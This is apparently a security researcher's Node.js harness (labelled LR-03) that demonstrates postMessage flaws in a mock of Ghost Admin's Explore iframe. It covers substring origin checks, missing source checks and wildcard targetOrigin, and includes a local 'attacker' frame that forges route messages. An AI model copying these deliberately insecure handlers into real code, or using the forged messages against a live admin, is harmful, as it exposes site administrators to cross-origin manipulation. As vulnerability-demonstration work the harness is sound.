#!/usr/bin/env node

import http from 'node:http';

const preferredMainPort = Number.parseInt(process.env.PORT || '7787', 10);
const runCli = process.argv.includes('--cli') || process.argv.includes('--self-test');

function runCliEvidence() {
    const exploreUrl = 'https://ghost.org/explore/';
    const exploreFrameWindow = {
        id: 'explore-frame',
        messages: [],
        postMessage(data, targetOrigin) {
            this.messages.push({data, targetOrigin});
        }
    };
    const sameExploreOriginNonFrameWindow = {id: 'same-explore-origin-not-the-explore-frame'};

    const state = {
        hash: '#/explore',
        exploreWindowOpen: true,
        isIframeTransition: false,
        lastTransitionTo: null,
        siteData: null
    };

    function toggleExploreWindow(value) {
        state.exploreWindowOpen = value;
    }

    function transitionTo(route) {
        state.lastTransitionTo = route;
        state.hash = route.startsWith('#') ? route : `#${route}`;
    }

    function handleRouteUpdate(data) {
        const route = data.route;
        state.isIframeTransition = route?.includes('/explore');
        toggleExploreWindow(state.isIframeTransition);
        transitionTo(route);
    }

    function handleExploreIframeMessage(event) {
        if (event?.data && exploreUrl.includes(event?.origin)) {
            if (event.data?.route) {
                handleRouteUpdate(event.data);
            }

            if (event.data?.request === 'apiUrl') {
                exploreFrameWindow.postMessage({
                    request: 'apiUrl',
                    response: {
                        apiUrl: '127.0.0.1:2368',
                        darkMode: false
                    }
                }, '*');
            }
        }
    }

    function handleRouteChangeInIframe(destinationRoute) {
        if (state.exploreWindowOpen) {
            let exploreRoute = '#/explore';

            if (destinationRoute.match(/^\/explore(\/.*)?/)) {
                destinationRoute = destinationRoute.replace(/\/explore/, '');
            }

            if (destinationRoute !== '/') {
                exploreRoute += destinationRoute;
            }

            if (state.hash !== exploreRoute) {
                state.hash = exploreRoute;
            }
        }
    }

    handleExploreIframeMessage({
        origin: 'https://ghost.org',
        source: sameExploreOriginNonFrameWindow,
        data: {route: '/explore/about'}
    });

    console.log('LR-03 component accepted explore-origin route:', state.lastTransitionTo === '/explore/about');
    console.log('LR-03 event.source is real explore iframe:', sameExploreOriginNonFrameWindow === exploreFrameWindow);
    console.log('LR-03 component transitionTo:', state.lastTransitionTo);
    console.log('LR-03 component hash after route:', state.hash);

    state.hash = '#/explore';
    state.exploreWindowOpen = true;

    console.log('LR-03 service route before:', state.hash);
    handleRouteChangeInIframe('/explore/about');
    console.log('LR-03 service route after cross-origin style message:', state.hash);

    exploreFrameWindow.postMessage({
        query: 'routeUpdate',
        response: {path: '/explore/about'}
    }, '*');

    const routeUpdateMessage = exploreFrameWindow.messages.at(-1);
    console.log('LR-03 outbound targetOrigin:', routeUpdateMessage.targetOrigin);
    console.log('LR-03 outbound message:', JSON.stringify(routeUpdateMessage.data));
}

function sendHtml(res, html) {
    res.writeHead(200, {
        'content-type': 'text/html; charset=utf-8',
        'cache-control': 'no-store'
    });
    res.end(html);
}

function sendNotFound(res) {
    res.writeHead(404, {'content-type': 'text/plain; charset=utf-8'});
    res.end('Not found');
}

function listenAvailable(server, port) {
    return new Promise((resolve, reject) => {
        const tryPort = (candidate) => {
            server.once('error', (error) => {
                if (error.code === 'EADDRINUSE') {
                    tryPort(candidate + 1);
                    return;
                }

                reject(error);
            });

            server.listen(candidate, '127.0.0.1', () => {
                resolve(candidate);
            });
        };

        tryPort(port);
    });
}

function framePage(title, accent, script = '') {
    return `<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>${title}</title>
    <style>
        body { margin: 0; padding: 12px; font: 14px/1.45 system-ui, sans-serif; color: #1f2937; background: #fff; }
        h1 { margin: 0 0 8px; font-size: 15px; color: ${accent}; }
        button { margin: 0 6px 8px 0; padding: 6px 8px; }
        pre { margin: 0; min-height: 78px; padding: 8px; white-space: pre-wrap; word-break: break-word; border: 1px solid #d1d5db; background: #f9fafb; }
    </style>
</head>
<body>
    <h1>${title}</h1>
    <button id="api-url" hidden>request apiUrl</button>
    <button id="route" hidden>send route</button>
    <pre id="log">ready</pre>
    <script>
        const log = (message) => {
            document.getElementById('log').textContent += '\\n' + message;
            console.log('[${title}]', message);
        };

        window.addEventListener('message', (event) => {
            log('received from ' + event.origin + ' data=' + JSON.stringify(event.data));
        });

        ${script}
    </script>
</body>
</html>`;
}

function exploreFramePage(adminOrigin) {
    return framePage('Explore iframe mock', '#047857', `
        document.getElementById('api-url').hidden = false;
        document.getElementById('route').hidden = false;

        function requestApiUrl() {
            parent.postMessage({request: 'apiUrl'}, '${adminOrigin}');
            log('sent {request:"apiUrl"} to Admin parent');
        }

        function sendRoute() {
            parent.postMessage({route: '/explore/about'}, '${adminOrigin}');
            log('sent {route:"/explore/about"} to Admin parent');
        }

        document.getElementById('api-url').addEventListener('click', requestApiUrl);
        document.getElementById('route').addEventListener('click', sendRoute);

        window.addEventListener('message', (event) => {
            if (event.data?.command === 'requestApiUrl') {
                requestApiUrl();
            }

            if (event.data?.command === 'sendRoute') {
                sendRoute();
            }
        });
    `);
}

function sameExploreOriginSenderPage(adminOrigin) {
    return framePage('Same Explore-origin non-Explore frame', '#be123c', `
        document.getElementById('route').hidden = false;

        function sendRoute() {
            parent.postMessage({route: '/explore/about'}, '${adminOrigin}');
            log('sent {route:"/explore/about"} to Admin parent');
        }

        document.getElementById('route').addEventListener('click', sendRoute);

        window.addEventListener('message', (event) => {
            if (event.data?.command === 'sendRoute') {
                sendRoute();
            }
        });
    `);
}

function routeSenderPage(route, adminOrigin) {
    return framePage('Cross-origin route sender', '#b45309', `
        document.getElementById('route').hidden = false;

        function sendRoute() {
            parent.postMessage({route: '${route}'}, '${adminOrigin}');
            log('sent {route:"${route}"} to Admin parent');
        }

        document.getElementById('route').addEventListener('click', sendRoute);

        window.addEventListener('message', (event) => {
            if (event.data?.command === 'sendRoute') {
                sendRoute();
            }
        });
    `);
}

function adminPage({exploreOrigin, attackerOrigin}) {
    const exploreUrl = `${exploreOrigin}/explore/`;

    return `<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>LR-03 Ghost Explore Harness</title>
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font: 14px/1.45 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; color: #111827; background: #f3f4f6; }
        header { padding: 18px 22px; color: #fff; background: #111827; }
        h1 { margin: 0; font-size: 20px; font-weight: 650; }
        main { display: grid; gap: 16px; max-width: 1180px; margin: 0 auto; padding: 18px 22px 28px; }
        section { padding: 14px; border: 1px solid #d1d5db; border-radius: 8px; background: #fff; }
        h2 { margin: 0 0 10px; font-size: 16px; }
        p { margin: 0 0 10px; color: #4b5563; }
        button { margin: 0 8px 8px 0; padding: 8px 10px; border: 1px solid #9ca3af; border-radius: 6px; background: #fff; cursor: pointer; }
        button:hover { background: #f9fafb; }
        code { padding: 1px 4px; border-radius: 4px; color: #111827; background: #e5e7eb; }
        iframe { width: 100%; min-height: 150px; border: 1px solid #cbd5e1; border-radius: 6px; background: #fff; }
        pre { min-height: 190px; margin: 0; padding: 10px; overflow: auto; white-space: pre-wrap; word-break: break-word; color: #e5e7eb; border-radius: 6px; background: #0f172a; }
        .grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
        .state { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 10px; }
        .state span { padding: 4px 7px; border-radius: 999px; background: #e5e7eb; }
    </style>
</head>
<body>
    <header>
        <h1>LR-03 Ghost Explore postMessage Harness</h1>
    </header>
    <main>
        <section>
            <h2>Admin-like Controls</h2>
            <p>This mirrors the relevant Explore Admin behavior: fixed Explore URL, <code>explore-frame</code>, component message listener, service route listener, dummy Admin API URL, and wildcard outbound messages. Ghost, Docker, database, and real ghost.org are not started.</p>
            <button id="real-api">Real Explore iframe requests apiUrl</button>
            <button id="same-origin-route">Non-Explore frame on Explore origin sends route</button>
            <button id="cross-origin-route">Cross-origin frame sends route</button>
            <button id="route-update">Admin sends routeUpdate with wildcard</button>
            <button id="reset">Reset</button>
            <div class="state">
                <span id="hash-state">Admin hash: #/explore</span>
                <span id="window-state">exploreWindowOpen: true</span>
                <span id="transition-state">last transitionTo: none</span>
            </div>
            <pre id="log"></pre>
        </section>

        <section>
            <h2>Frames</h2>
            <div class="grid">
                <iframe id="explore-frame" title="explore iframe" src="${exploreUrl}"></iframe>
                <iframe id="same-explore-origin-frame" title="same Explore-origin sender" src="${exploreOrigin}/same-explore-origin-sender.html"></iframe>
                <iframe id="cross-origin-route-frame" title="cross-origin route sender" src="${attackerOrigin}/route-sender.html"></iframe>
            </div>
        </section>
    </main>

    <script>
        const exploreFrame = document.getElementById('explore-frame');
        const sameExploreOriginFrame = document.getElementById('same-explore-origin-frame');
        const crossOriginRouteFrame = document.getElementById('cross-origin-route-frame');
        const logEl = document.getElementById('log');
        const state = {
            hash: '#/explore',
            exploreWindowOpen: true,
            isIframeTransition: false,
            lastTransitionTo: 'none',
            siteData: null
        };

        const exploreUrl = '${exploreUrl}';

        function log(message) {
            logEl.textContent += message + '\\n';
            logEl.scrollTop = logEl.scrollHeight;
            console.log('[lr-03]', message);
        }

        function renderState() {
            document.getElementById('hash-state').textContent = 'Admin hash: ' + state.hash;
            document.getElementById('window-state').textContent = 'exploreWindowOpen: ' + state.exploreWindowOpen;
            document.getElementById('transition-state').textContent = 'last transitionTo: ' + state.lastTransitionTo;
        }

        function reset() {
            state.hash = '#/explore';
            state.exploreWindowOpen = true;
            state.isIframeTransition = false;
            state.lastTransitionTo = 'none';
            state.siteData = null;
            logEl.textContent = '';
            renderState();
            log('ready');
            log('configured Explore iframe URL: ' + exploreUrl);
        }

        function transitionTo(route) {
            state.lastTransitionTo = route;
            state.hash = route.startsWith('#') ? route : '#' + route;
            renderState();
            log('router.transitionTo("' + route + '")');
        }

        function toggleExploreWindow(value) {
            state.exploreWindowOpen = value;
            renderState();
            log('toggleExploreWindow(' + value + ')');
        }

        function handleRouteUpdate(data) {
            const route = data.route;
            state.isIframeTransition = route?.includes('/explore');
            toggleExploreWindow(state.isIframeTransition);
            transitionTo(route);
        }

        function handleUrlRequest() {
            exploreFrame.contentWindow.postMessage({
                request: 'apiUrl',
                response: {
                    apiUrl: '127.0.0.1:2368',
                    darkMode: false
                }
            }, '*');
            log('component sent apiUrl response to explore-frame with targetOrigin="*"');
        }

        function handleExploreIframeMessage(event) {
            if (event?.data && exploreUrl.includes(event?.origin)) {
                log('component accepted message from origin ' + event.origin + '; source is explore-frame: ' + (event.source === exploreFrame.contentWindow));

                if (event.data?.request === 'apiUrl') {
                    handleUrlRequest();
                }

                if (event.data?.route) {
                    handleRouteUpdate(event.data);
                }

                if (event.data?.siteData) {
                    state.siteData = event.data.siteData ?? {};
                    log('component updated siteData');
                }
            }
        }

        function handleRouteChangeInIframe(destinationRoute) {
            if (state.exploreWindowOpen) {
                let exploreRoute = '#/explore';

                if (destinationRoute.match(/^\\/explore(\\/.*)?/)) {
                    destinationRoute = destinationRoute.replace(/\\/explore/, '');
                }

                if (destinationRoute !== '/') {
                    exploreRoute += destinationRoute;
                }

                if (state.hash !== exploreRoute) {
                    state.hash = exploreRoute;
                    renderState();
                    log('explore service accepted route without origin/source check; hash changed to ' + exploreRoute);
                }
            }
        }

        window.addEventListener('message', (event) => {
            handleExploreIframeMessage(event);

            if (event && event.data && event.data.route) {
                log('route message arrived from ' + event.origin + ' data=' + JSON.stringify(event.data));
                handleRouteChangeInIframe(event.data.route);
            }
        });

        document.getElementById('real-api').addEventListener('click', () => {
            exploreFrame.contentWindow.postMessage({command: 'requestApiUrl'}, '${exploreOrigin}');
            log('asked real Explore iframe to request apiUrl');
        });

        document.getElementById('same-origin-route').addEventListener('click', () => {
            sameExploreOriginFrame.contentWindow.postMessage({command: 'sendRoute'}, '${exploreOrigin}');
            log('asked non-Explore frame on Explore origin to send {route:"/explore/about"}');
        });

        document.getElementById('cross-origin-route').addEventListener('click', () => {
            crossOriginRouteFrame.contentWindow.postMessage({command: 'sendRoute'}, '${attackerOrigin}');
            log('asked cross-origin frame to send {route:"/explore/about"}');
        });

        document.getElementById('route-update').addEventListener('click', () => {
            exploreFrame.contentWindow.postMessage({
                query: 'routeUpdate',
                response: {path: '/explore/about'}
            }, '*');
            log('explore service sent routeUpdate to explore-frame with targetOrigin="*"');
        });

        document.getElementById('reset').addEventListener('click', reset);

        reset();
    </script>
</body>
</html>`;
}

async function runBrowserHarness() {
    let mainPort;
    let explorePort;
    let attackerPort;

    const mainServer = http.createServer((req, res) => {
        const url = new URL(req.url, `http://127.0.0.1:${mainPort}`);

        if (url.pathname === '/') {
            sendHtml(res, adminPage({
                exploreOrigin: `http://127.0.0.1:${explorePort}`,
                attackerOrigin: `http://127.0.0.1:${attackerPort}`
            }));
            return;
        }

        sendNotFound(res);
    });

    const exploreServer = http.createServer((req, res) => {
        const url = new URL(req.url, `http://127.0.0.1:${explorePort}`);
        const adminOrigin = `http://127.0.0.1:${mainPort}`;

        if (url.pathname === '/explore/' || url.pathname === '/explore' || url.pathname === '/') {
            sendHtml(res, exploreFramePage(adminOrigin));
            return;
        }

        if (url.pathname === '/same-explore-origin-sender.html') {
            sendHtml(res, sameExploreOriginSenderPage(adminOrigin));
            return;
        }

        sendNotFound(res);
    });

    const attackerServer = http.createServer((req, res) => {
        const url = new URL(req.url, `http://127.0.0.1:${attackerPort}`);
        const adminOrigin = `http://127.0.0.1:${mainPort}`;

        if (url.pathname === '/route-sender.html' || url.pathname === '/') {
            sendHtml(res, routeSenderPage('/explore/about', adminOrigin));
            return;
        }

        sendNotFound(res);
    });

    mainPort = await listenAvailable(mainServer, preferredMainPort);
    explorePort = await listenAvailable(exploreServer, mainPort + 1);
    attackerPort = await listenAvailable(attackerServer, explorePort + 1);

    console.log(`LR-03 Ghost-like Explore harness: http://127.0.0.1:${mainPort}/`);
    console.log(`Explore mock origin: http://127.0.0.1:${explorePort}/explore/`);
    console.log(`Cross-origin route sender: http://127.0.0.1:${attackerPort}/route-sender.html`);
    console.log('Press Ctrl+C to stop.');
}

if (runCli) {
    runCliEvidence();
} else {
    await runBrowserHarness();
}
